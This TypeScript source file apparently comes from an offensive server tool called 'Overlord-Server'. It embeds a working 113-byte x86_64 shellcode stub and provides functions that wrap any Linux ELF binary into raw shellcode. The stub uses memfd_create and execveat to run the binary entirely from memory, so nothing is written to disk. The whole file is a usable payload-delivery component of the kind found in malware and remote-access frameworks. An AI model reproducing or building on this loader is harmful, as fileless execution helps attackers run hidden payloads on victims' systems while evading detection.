import fs from "fs";
import path from "path";

// 113-byte x86_64 Linux ELF-in-memory loader shellcode stub
// Entry: executes ELF appended after stub via memfd_create + execveat (syscalls 319, 1, 322)
// Layout after stub: [uint32le ELF size][ELF bytes]
// Source: Overlord-Server/tools/elf_loader.asm
const ELF_LOADER_STUB_X64 = new Uint8Array([
  0xe8, 0x02, 0x00, 0x00, 0x00, 0x6d, 0x00, 0x5b, 0x48, 0x89, 0xdf, 0x6a,
  0x01, 0x5e, 0x68, 0x3f, 0x01, 0x00, 0x00, 0x58, 0x0f, 0x05, 0x48, 0x85,
  0xc0, 0x78, 0x4e, 0x50, 0x41, 0x5c, 0x48, 0x8d, 0x4b, 0x6c, 0x8b, 0x11,
  0x48, 0x8d, 0x71, 0x04, 0x85, 0xd2, 0x74, 0x1a, 0x52, 0x56, 0x41, 0x54,
  0x5f, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x5e, 0x5a, 0x48, 0x85,
  0xc0, 0x7e, 0x2a, 0x48, 0x01, 0xc6, 0x29, 0xc2, 0xeb, 0xe2, 0x6a, 0x00,
  0x48, 0x8d, 0x34, 0x24, 0x6a, 0x00, 0x48, 0x8d, 0x14, 0x24, 0x6a, 0x00,
  0x4c, 0x8d, 0x14, 0x24, 0x41, 0x54, 0x5f, 0x41, 0xb8, 0x00, 0x10, 0x00,
  0x00, 0x68, 0x42, 0x01, 0x00, 0x00, 0x58, 0x0f, 0x05, 0x6a, 0x01, 0x5f,
  0x6a, 0x3c, 0x58, 0x0f, 0x05,
]);

/**
 * Wraps a Linux ELF binary in a position-independent shellcode stub.
 *
 * The result is raw x86_64 shellcode that, when executed, uses
 * memfd_create + execveat to load and run the embedded ELF entirely
 * from anonymous memory — no file is written to disk.
 *
 * Layout: [113-byte stub][4-byte LE ELF size][ELF bytes]
 */
export function wrapElfAsShellcode(elfBytes: Buffer): Buffer {
  const stub = ELF_LOADER_STUB_X64;
  const sizeBuf = Buffer.alloc(4);
  sizeBuf.writeUInt32LE(elfBytes.length, 0);
  return Buffer.concat([Buffer.from(stub), sizeBuf, elfBytes]);
}

/**
 * Reads elfPath, wraps it, writes shellcode to scPath.
 * Returns size of output on success.
 */
export function buildLinuxShellcode(
  elfPath: string,
  scPath: string,
  sendToStream: (data: any) => void,
): boolean {
  try {
    const elfBytes = fs.readFileSync(elfPath);
    const sc = wrapElfAsShellcode(elfBytes);
    fs.mkdirSync(path.dirname(scPath), { recursive: true });
    fs.writeFileSync(scPath, sc);
    sendToStream({
      type: "output",
      text: `Linux shellcode: ${elfBytes.length} byte ELF → ${sc.length} byte stub (${sc.length - elfBytes.length} byte header)\n`,
      level: "info",
    });
    return true;
  } catch (err: any) {
    sendToStream({
      type: "output",
      text: `Linux shellcode wrap failed: ${err.message ?? err}\n`,
      level: "error",
    });
    return false;
  }
}
